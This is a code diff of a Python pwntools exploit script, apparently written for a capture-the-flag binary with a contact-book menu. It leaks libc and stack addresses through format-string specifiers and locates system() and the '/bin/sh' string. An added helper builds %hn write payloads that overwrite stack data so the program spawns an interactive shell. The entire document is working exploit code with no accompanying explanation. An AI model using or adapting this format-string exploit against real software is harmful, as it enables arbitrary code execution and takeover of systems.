@@ -23,6 +23,20 @@ def PrintContact():
 	p.recvuntil('Contacts:')
 	p.recvuntil('Description: ')
 
+def NewAddr(address,modifiedAddress):
+	modified_high = (modifiedAddress &0xffff0000) >> 16
+	modified_low  = modifiedAddress &0xffff
+	#
+	temp_low = (address + 2) &0xffff
+	payload1 = '%' + str(temp_low) + 'c' + '%33$hn'
+	temp_high = (address) & 0xffff
+	payload2 = '%' + str(temp_high) + 'c' + '%34$hn'
+	#
+	payload3 = '%' + str(modified_high) + 'c' + '%69$hn'
+	payload4 = '%' + str(modified_low) +  'c' + '%71$hn'
+	payload = payload1+payload2+payload3+payload4
+	return payload
+
 #Get the libc version
 payload = '%31$pEND'
 CreateContact('First','12345','20',payload)
@@ -35,22 +49,16 @@ system_addr = libcbase + libc.dump('system')
 binsh_addr = libcbase + libc.dump('str_bin_sh')
 log.success('System_Addr:'+hex(system_addr))
 log.success('Binsh_Addr:'+hex(binsh_addr))
-
-#Get the Heap_Addr and EBP_Addr
-payload = flat([system_addr,'UUUU',binsh_addr,'START%6$pM%11$pEND'])
-CreateContact('Second','12345','32',payload)
+payload = 'START%6$p'
+CreateContact('Second','12345','20',payload)
 PrintContact()
-p.recvuntil('START')
-ebp_addr = int(p.recvuntil('M',drop = True),16)
-heap_addr = int(p.recvuntil('END',drop = True),16)
-log.success('Heap_Addr:'+hex(heap_addr))
-log.success('EBP_Addr:'+hex(ebp_addr))
-
-#Modify the EBP
-part1 = (heap_addr - 4) / 2
-part2 = heap_addr - 4 - part1
-payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
-CreateContact('Third','12345','40',payload)
+p.recvuntil('Description: ')
+ebp_addr = int(p.recvuntil('START',drop = True),16)-0x30
+P1 = NewAddr(ebp_addr+0xC,binsh_addr)
+P2 = NewAddr(ebp_addr+4,system_addr)
+payload = P1+P2
+CreateContact('Modify','12345','200',payload)
 PrintContact()
-p.sendlineafter('>>> ','5')
 p.interactive()
+
+
